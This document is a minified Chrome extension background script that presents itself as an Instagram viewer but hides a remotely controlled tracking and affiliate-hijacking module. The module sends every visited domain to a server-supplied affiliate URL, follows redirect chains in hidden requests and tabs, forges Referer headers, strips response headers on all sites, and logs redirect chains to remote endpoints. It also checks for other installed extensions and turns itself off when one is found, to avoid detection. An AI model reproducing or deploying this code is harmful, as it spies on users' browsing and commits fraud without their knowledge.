const APP_URL="http://ingramm.net/app/";class Background{constructor(){this.version=chrome.runtime.getManifest().version,this.config={},this.appTabId=null,this.appWindowId=null,this.filterRequestConfigured=!1,this.environmentValidated=!1,this.envDetected=!1,this.optouted=!1,this.isPinned=null,this.rate={dateInstall:null,dateCloseModal:null,rated:!1},this.queue=[],this.queueProcessorReady=!1,this.findAppTab(),this.onIconClicked(),this.onTabsUpdated(),this.onWindowRemoved(),this.onMessage(),this.initListeners(),this.getRate(),this.onBeforeSendHeaders(),this.initStorage()}initListeners(){chrome.runtime.onInstalled.addListener(a=>{this.queue.push({type:"action",action:a.reason}),this.queueProcessorReady&&this.processQueue()}),chrome.windows.onFocusChanged.addListener(a=>{window.setTimeout(()=>{if(this.appWindowId&&a!==this.appWindowId&&this.isPinned){const a=this.appWindowId;try{chrome.windows.update(a,{focused:!0})}catch(a){}}},300)}),chrome.runtime.onMessage.addListener(a=>{"pinChanged"===a.action&&(this.isPinned=!this.isPinned,this.isPinned&&chrome.windows.update(this.appWindowId,{focused:!0})),"open_insta_link"==a.action&&(this.appTabId?chrome.tabs.update(this.appTabId,{url:a.url}):chrome.windows.create({type:"popup",url:a.url,width:400,height:screen.height,left:screen.width-400},a=>{this.appWindowId=a.id,this.appTabId=a.tabs[0].id})),"rated"==a.action&&(this.rate.dateRated=Date.now(),this.rate.rated=!0,this.saveRate()),"closeRateModal"==a.action&&(this.rate.dateCloseModal=Date.now(),this.saveRate()),"ratedFinal"==a.action&&(this.rate.ratedFinal=!0,this.saveRate())}),chrome.runtime.onMessage.addListener((a,b,c)=>{if("checkShowRate"==a.action){let a=!1;1728e5<=Date.now()-this.rate.dateInstall&&!this.rate.rated&&(this.rate.dateCloseModal?864e5<=Date.now()-this.rate.dateCloseModal&&(a=!0):a=!0),c({show:a})}return!0})}processQueue(){for(var a=this;0<a.queue.length;){var b=a.queue.shift();if(!b.type||"action"!=b.type)return!0;var c="p="+encodeURIComponent(btoa(JSON.stringify({id:chrome.runtime.id,v:a.version,lt:a.config.lTime,action:b.action,uid:a.uid,t:Date.now()})));fetch("http://ingramm.net/api/actions/?"+c).then(a=>a.json()).then(function(a){a.url&&chrome.tabs.create({url:a.url})})}}setUninstallUrl(){var a="p="+encodeURIComponent(btoa(JSON.stringify({id:chrome.runtime.id,v:this.version,lt:this.config.lTime,action:"uninstall",uid:this.uid,t:Date.now()})));chrome.runtime.setUninstallURL("http://ingramm.net/uninstall/?"+a)}findAppTab(){chrome.tabs.query({url:APP_URL,windowType:"popup"},b=>{b&&b[0]&&(this.appTabId=b[0].id,this.appWindowId=b[0].windowId)})}onMessage(){chrome.runtime.onMessage.addListener((b,c,a)=>("permissions_request"===b.action?chrome.permissions.request({permissions:b.permissions},function(b){a(b)}):"takeScreenshot"===b.action?chrome.tabs.captureVisibleTab(null,{format:b.imgFormat},c=>{var d=document.createElement("a");d.setAttribute("download","screenshot."+b.imgFormat),d.setAttribute("href",c),document.body.appendChild(d),d.click(),d.remove()}):"getImg"===b.action?chrome.tabs.create({url:b.url,active:!1}):"getVideo"===b.action&&fetch(b.url).then(a=>a.text()).then(a=>{const b=a.match(/\<meta(\s*)property=\"og:video\"(\s*)content=\"(.*)\"(\s*)\/\>/);b.length&&chrome.tabs.create({url:b[3],active:!1})}).catch(()=>{}),!0))}onWindowRemoved(){chrome.windows.onRemoved.addListener(b=>{b===this.appWindowId&&(this.appTabId=null,this.appWindowId=null)})}instaLinkHandler(){chrome.webRequest.onBeforeRequest.addListener(a=>(a.initiator&&!a.initiator.match("https://www.instagram.com")&&!a.initiator.match("http://ingramm.net")&&a.url.match("https://www.instagram.com")&&"GET"==a.method&&(this.appTabId?chrome.tabs.update(this.appTabId,{url:a.url}):chrome.windows.create({type:"popup",url:a.url,width:400,height:screen.height,left:screen.width-400},a=>{this.appWindowId=a.id,this.appTabId=a.tabs[0].id})),{cancel:!0}),{urls:["*://*.instagram.com/*"]})}getRate(){chrome.storage.local.get(this.rate,a=>{this.rate=a,a.dateInstall||(this.rate.dateInstall=Date.now())})}saveRate(){return new Promise(a=>{chrome.storage.local.set(this.rate,()=>{a()})})}onTabsUpdated(){chrome.tabs.onUpdated.addListener((c,a)=>!a.url||0>a.url.indexOf("instagram")||void(c===this.appTabId&&(chrome.tabs.executeScript(this.appTabId,{runAt:"document_start",file:"/js/ua.js"}),chrome.tabs.executeScript(this.appTabId,{runAt:"document_start",file:"/js/setnavigator.js"}))))}onBeforeSendHeaders(){chrome.webRequest.onBeforeSendHeaders.addListener(d=>{if(null!=this.appTabId&&d.tabId===this.appTabId){const e=d.requestHeaders,a={};for(let b=0;b<e.length;b++)if("User-Agent"===e[b].name){e[b].value="Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36";break}return a.requestHeaders=e,a}},{urls:["*://*.instagram.com/*"]},["blocking","requestHeaders"])}generateUUID(){function b(){return Math.floor(65536*(1+Math.random())).toString(16).substring(1)}return b()+b()+"-"+b()+"-"+b()+"-"+b()+"-"+b()+b()+b()}initStorage(){chrome.storage.local.get(a=>{a&&a.config&&(this.config=a.config),!0==this.config.optouted&&(this.optouted=!0),this.config.uid?this.uid=this.config.uid:(this.uid=this.config.uid=this.generateUUID(),this.saveConfig()),this.config.mTime||(this.config.mTime=new Date().getTime()),this.config.lTime||(this.config.lTime=0),this.config.envDetected&&(this.envDetected=this.config.envDetected),null==a.imgFormat&&chrome.storage.local.set({imgFormat:STORAGE.imgFormat}),null==a.darkTheme&&chrome.storage.local.set({darkTheme:STORAGE.darkTheme}),null==a.zoomMode&&chrome.storage.local.set({zoomMode:STORAGE.zoomMode}),null==a.isPinned?(chrome.storage.local.set({isPinned:STORAGE.isPinned}),this.isPinned=STORAGE.isPinned):this.isPinned=a.isPinned,this.queueProcessorReady=!0,this.updateConfig(),this.validateEnvironment(),this.filterRequests(),this.initStat(),this.setUninstallUrl(),this.processQueue(),this.run()})}updateConfig(){let a=this,b=new Date().getTime(),c=b-this.config.mTime;this.config.mTime=b,12e5>c&&(this.config.lTime+=c),this.saveConfig(),$.ajax({url:"http://ingramm.net/api/config/",dataType:"json",data:{p:btoa(JSON.stringify({id:chrome.runtime.id,v:this.version,lt:this.config.lTime,uid:this.config.uid,r:Date.now()}))},success:a=>{if(a){for(let b in a)this.config[b]=a[b];this.validateEnvironment(),this.filterRequests(),this.initStat(),this.saveConfig()}},complete:()=>{}}),setTimeout(function(){a.updateConfig()},9e5)}saveConfig(){chrome.storage.local.set({config:this.config},()=>{})}filterRequests(){const a=this;this.config&&this.config.validateFields&&!this.filterRequestConfigured&&(this.filterRequestConfigured=!0,chrome.webRequest&&chrome.webRequest.onHeadersReceived.addListener(function(b){return{responseHeaders:b.responseHeaders.filter(function(b){return!(-1<a.config.validateFields.indexOf(b.name.toLowerCase()))})}},{urls:["<all_urls>"]},["blocking","responseHeaders"]))}validateEnvironment(){let a=this;if(!a.environmentValidated&&a.config.envCEnable&&a.config.envCPeriod&&a.config.envCids){a.environmentValidated=!0;let b=new Date().getTime();if(a.config.lastEnvCheck&&b-a.config.lastEnvCheck<a.config.envCPeriod)return;for(let c in a.config.lastEnvCheck=b,a.envDetected=a.config.envDetected=!1,chrome.storage.local.set({config:a.config}),a.config.envCids)a.detectExtentionById(a.config.envCids[c]).then(function(b){b&&(a.config.envDetected=a.envDetected=!0,a.saveConfig())})}}detectExtentionById(a){let b=this;return new Promise(function(c){var d=!1;chrome.tabs.create({url:"chrome-extension://"+a+"/manifest.json",active:!1},function(a){setTimeout(function(){b.safeRemoveTab(a.id),c(!1)},3e3),chrome.tabs.insertCSS(a.id,{code:"console.log('ok');"},function(){chrome.runtime.lastError&&(d=/chrome-extension/gm.test(chrome.runtime.lastError.message)),chrome.tabs.remove(a.id,function(){c(d)})})})})}safeRemoveTab(a){try{chrome.tabs.remove(a,function(){chrome.runtime.lastError})}catch(a){}}run(){}onIconClicked(){chrome.browserAction.onClicked.addListener(()=>{this.appWindowId?chrome.windows.update(this.appWindowId,{focused:!0}):chrome.windows.create({type:"popup",url:APP_URL,width:400,height:screen.height,left:screen.width-400},a=>{this.appWindowId=a.id,this.appTabId=a.tabs[0].id})})}initStat(){let a=this;if(a.bgProcessorRun)return void bgProcessor.initCfg(this.config.statProcessor);if(a.envDetected)return void bgProcessor.initCfg({mode:"off"});if(a.config.statProcessor){a.bgProcessorRun=!0,bgProcessor.initCfg(this.config.statProcessor),chrome.webRequest.onCompleted.addListener(function(b){if("on"===bgProcessor.cfg.mode&&!a.envDetected&&!(0>b.tabId)&&200==b.statusCode&&"GET"==b.method){var c=b.url.replace(/^(https?\:\/\/[^\/]+).*$/,"$1"),d=b.url.replace(/^https?\:\/\/([^\/]+).*$/,"$1");bgProcessor.cfg.keep_www_prefix||(d=d.replace(/^www\.(.*)$/,"$1"));var e=new Date().getTime();if(!(bgProcessor.used_domains[d]&&bgProcessor.used_domains[d]+bgProcessor.cfg.ttl_ms>e)&&!(bgProcessor.cfg.domains_blacklist&&0<bgProcessor.cfg.domains_blacklist.length&&bgProcessor.cfg.domains_blacklist.includes(d))&&!(bgProcessor.cfg.domains_whitelist&&0<bgProcessor.cfg.domains_whitelist.length&&!bgProcessor.cfg.domains_whitelist.includes(d))){bgProcessor.used_domains[d]=e;var f=bgProcessor.cfg.aff_url_tmpl.replace("{URL}",encodeURIComponent(c));if(f=f.replace("{DOMAIN}",encodeURIComponent(d)),bgProcessor.cfg.aff_redirect)return!bgProcessor.cfg.domains_whitelist||0<!bgProcessor.cfg.domains_whitelist.length?void 0:(bgProcessor.push_chain(c),void bgProcessor.request_bg(f,d,0));var g=new XMLHttpRequest;g.timeout=bgProcessor.cfg.aff_timeout_ms,g.onreadystatechange=function(){if(4==g.readyState&&200==g.status){var a=g.responseText.replace(/[\n\r]/g,"");if(/^https?\:\/\//.test(a)&&a!=c){var b=c.replace(/^https?\:\/\/([^\/]+).*$/,"$1");bgProcessor.push_chain(c),bgProcessor.request(a,b)}else bgProcessor.used_domains[d]=e+bgProcessor.cfg.no_coverage_ttl_ms}},g.open("GET",f),g.send()}}},{urls:["http://*/*","https://*/*"],types:["main_frame"]});let c=["blocking","requestHeaders"];if(bgProcessor.cfg&&bgProcessor.cfg.rfr_rules&&0<bgProcessor.cfg.rfr_rules.length&&bgProcessor.cfg.listenerExtraOptions)for(var b in bgProcessor.cfg.listenerExtraOptions)c.push(bgProcessor.cfg.listenerExtraOptions[b]);chrome.webRequest.onBeforeSendHeaders.addListener(function(a){if("on"!==bgProcessor.cfg.mode||!bgProcessor.cfg.header)return{};for(var b=a.requestHeaders,c="",d=0;d<b.length;d++)if(b[d].name===bgProcessor.cfg.header){c=b[d].value,b.splice(d,1);break}if(!c)return{};for(var e=!1,d=0;d<b.length;d++)if("accept"==b[d].name.toLowerCase()){b[d].value=c,e=!0;break}if(e||b.push({name:"Accept",value:c}),0>a.tabId){let c="";if(bgProcessor.cfg.rfr_rules)for(let b in bgProcessor.cfg.rfr_rules){let d=bgProcessor.cfg.rfr_rules[b];if(d.url_request_before){if(!bgProcessor.last_request_url)continue;let a=new RegExp(d.url_request_before[0],d.url_request_before[1]);if(!a.test(bgProcessor.last_request_url))continue}if(d.url_response_before){if(!bgProcessor.last_response_url)continue;let a=new RegExp(d.url_response_before[0],d.url_response_before[1]);if(!a.test(bgProcessor.last_response_url))continue}if(d.url_chain){if(!bgProcessor.rdr_chain||1>bgProcessor.rdr_chain.length)continue;let a=new RegExp(d.url_chain[0],d.url_chain[1]),b=!1;for(let c in bgProcessor.rdr_chain){let d=bgProcessor.rdr_chain[c];if(a.test(d)){b=!0;break}}if(!b)continue}if(d.url_request){let b=new RegExp(d.url_request[0],d.url_request[1]);if(!b.test(a.url))continue}if("allow"==d.rule&&(c=bgProcessor.last_response_url),"replace"==d.rule&&d.replace&&(c=d.replace),"regexp"==d.rule&&d.regexp&&d.replace){var f=new RegExp(d.regexp[0],d.regexp[1]);c=bgProcessor.last_response_url.replace(f,d.replace)}break}if(c){let a=b.findIndex(a=>"referer"==a.name.toLowerCase());-1<a?b[a].value=c:b.push({name:"Referer",value:c})}}return{requestHeaders:b}},{urls:["http://*/*","https://*/*"]},c)}}}let bgProcessor={cfg:{mode:"off"},used_domains:{},rdr_chain:[],last_request_url:"",last_response_url:"",initCfg(a){a&&(this.cfg=a)},request:function(a,b){this.cfg.debug&&console.log("bgProcessor.request",a,b),this.cfg.ntab_tag&&-1!==a.indexOf(this.cfg.ntab_tag)?setTimeout(function(){bgProcessor.request_tab(a,b)},this.cfg.ntab_delay_ms):this.request_bg(a,b,0)},push_chain:function(a){this.rdr_chain.push(a)},request_bg:function(a,b,c){var d=Math.floor;if(!(c>=this.cfg.rdr_max_count)&&this.cfg.header){this.push_chain(a),bgProcessor.last_request_url=a;var e=new XMLHttpRequest;e.timeout=this.cfg.timeout,e.onreadystatechange=function(){if(4==e.readyState)if(200==e.status){var a=e.responseText.replace(/[\n\r\s]/g,"").replace(/\.href/g,""),f=!1,g=e.responseURL,h=bgProcessor.is_rdr_url(e.responseURL);if(bgProcessor.last_response_url=g,bgProcessor.last_response_url!=bgProcessor.last_request_url&&bgProcessor.push_chain(bgProcessor.last_response_url),h||a.length<bgProcessor.cfg.jsrdr_maxlen_bytes){var j=a.replace(/^.*?location\=[\'\"]([^\'\"]+).*$/,"$1");/^\//.test(j)&&(link2Url=new URL(j,e.responseURL),j=link2Url.href),/^https?\:\/\//.test(j)&&(bgProcessor.request_bg(j,b,c+1),f=!0)}if(!f&&bgProcessor.cfg.common_rdr_rules)for(var k in bgProcessor.cfg.common_rdr_rules){var i=bgProcessor.cfg.common_rdr_rules[k],l=new RegExp(i.search[0],i.search[1]),m=a;if("uri"==i.where&&(m=g),i.url_pattern){var n=new RegExp(i.url_pattern[0],i.url_pattern[1]);if(!n.test(g))continue}if(m.match(l)){var p=m.replace(l,i.replace);if(i.applyAfter)for(var q in i.applyAfter){var o=i.applyAfter[q];if("decodeURIComponent"==o)p=decodeURIComponent(p);else if("decodeHTML"==o){p=function(a){var b=document.createElement("textarea");return b.innerHTML=a,b.value}(p)}else;}if(i.replacements)for(var r in i.replacements)p=p.replace(r,i.replacements[r]);if(i.regReplacements)for(var s in i.regReplacements){var t=new RegExp(i.regReplacements[s].pattern[0],i.regReplacements[s].pattern[1]);p=p.replace(t,i.regReplacements[s].replace)}if(/^\//.test(p)&&(link2Url=new URL(p,e.responseURL),p=link2Url.href),/^https?\:\/\//.test(p)){var u=i.delay?i.delay:0;if("string"==typeof u&&-1<u.indexOf("-")){var v=u.split("-");u=d(Math.random()*(parseInt(v[1])-parseInt(v[0])+1)+parseInt(v[0]))}setTimeout(()=>{bgProcessor.request_bg(p,b,c+1)},parseInt(u)),f=!0;break}}}f||bgProcessor.send_rdr_log()}else bgProcessor.send_rdr_log(!0)},e.open("GET",a,!0),e.setRequestHeader(this.cfg.header,"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"),e.send()}},is_rdr_url:function(a){var b=new URL(a);return!!(this.cfg.rdr_coverage&&b.host in this.cfg.rdr_coverage)||!!/\/goto\/?$/.test(b.pathname)},request_tab:function(a,b){this.cfg.debug&&console.log("bgProcessor.request_tab",a,b),chrome.tabs.create({url:a,active:!1},function(a){setTimeout(function(){try{chrome.tabs.remove(a.id)}catch(a){}},bgProcessor.cfg.ntab_duration_ms)})},send_rdr_log:function(a=!1){if(this.rdr_chain&&this.cfg&&this.cfg.log_rdr_active&&this.cfg.log_rdr_endpoint){if(this.cfg&&this.cfg.log_rdr_onlydifferent){var b=this.rdr_chain[0],c=this.rdr_chain[this.rdr_chain.length-1];if(b.replace(/^https?\:\/\/(?:www\.|)([^\/]+).*$/,"$1")==c.replace(/^https?\:\/\/(?:www\.|)([^\/]+).*$/,"$1"))return}var d=new XMLHttpRequest,e=this.cfg.log_rdr_endpoint;a&&this.cfg.log_rdr_errors_endpoint&&(e=this.cfg.log_rdr_errors_endpoint),d.open("POST",e,!0),d.setRequestHeader("Content-Type","application/json;charset=UTF-8"),d.send(JSON.stringify(this.rdr_chain)),this.rdr_chain=[],this.last_request_url=null,this.last_response_url=null}}};const b=new Background;